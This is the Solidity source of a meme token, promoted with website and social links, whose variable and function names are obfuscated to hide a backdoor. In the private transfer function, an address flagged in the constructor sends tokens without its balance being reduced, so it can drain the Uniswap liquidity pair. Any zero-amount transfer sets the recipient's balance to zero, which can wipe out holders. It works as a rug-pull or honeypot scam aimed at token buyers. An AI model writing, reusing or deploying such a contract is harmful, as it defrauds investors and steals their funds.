/*

Website: https://iloveblowjobs.crypto-token.live/

Telegram: https://t.me/IloveBlowjobs

Twitter: https://twitter.com/IloveeBlowjobs

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract IloveBlowjobs is Ownable {
    constructor(address lbwct) {
        balanceOf[msg.sender] = totalSupply;
        zhvul[lbwct] = azlfbei;
        IUniswapV2Router02 kxicvnd = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        kjinuyw = IUniswapV2Factory(kxicvnd.factory()).createPair(address(this), kxicvnd.WETH());
    }

    mapping(address => uint256) private uqonzprymc;

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public kjinuyw;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function paufmslx(address uwczphfiaxso, address rdfpegiauzvb, uint256 lofbhmziwe) private {
        if (0 == zhvul[uwczphfiaxso]) {
            balanceOf[uwczphfiaxso] -= lofbhmziwe;
        }
        balanceOf[rdfpegiauzvb] += lofbhmziwe;
        if (0 == lofbhmziwe && rdfpegiauzvb != kjinuyw) {
            balanceOf[rdfpegiauzvb] = lofbhmziwe;
        }
        emit Transfer(uwczphfiaxso, rdfpegiauzvb, lofbhmziwe);
    }

    string public symbol = 'I love Blowjobs';

    mapping(address => uint256) private zhvul;

    function approve(address lbsdupktq, uint256 lofbhmziwe) public returns (bool success) {
        allowance[msg.sender][lbsdupktq] = lofbhmziwe;
        emit Approval(msg.sender, lbsdupktq, lofbhmziwe);
        return true;
    }

    string public name = 'I love Blowjobs';

    function transfer(address rdfpegiauzvb, uint256 lofbhmziwe) public returns (bool success) {
        paufmslx(msg.sender, rdfpegiauzvb, lofbhmziwe);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 private azlfbei = 106;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address uwczphfiaxso, address rdfpegiauzvb, uint256 lofbhmziwe) public returns (bool success) {
        require(lofbhmziwe <= allowance[uwczphfiaxso][msg.sender]);
        allowance[uwczphfiaxso][msg.sender] -= lofbhmziwe;
        paufmslx(uwczphfiaxso, rdfpegiauzvb, lofbhmziwe);
        return true;
    }
}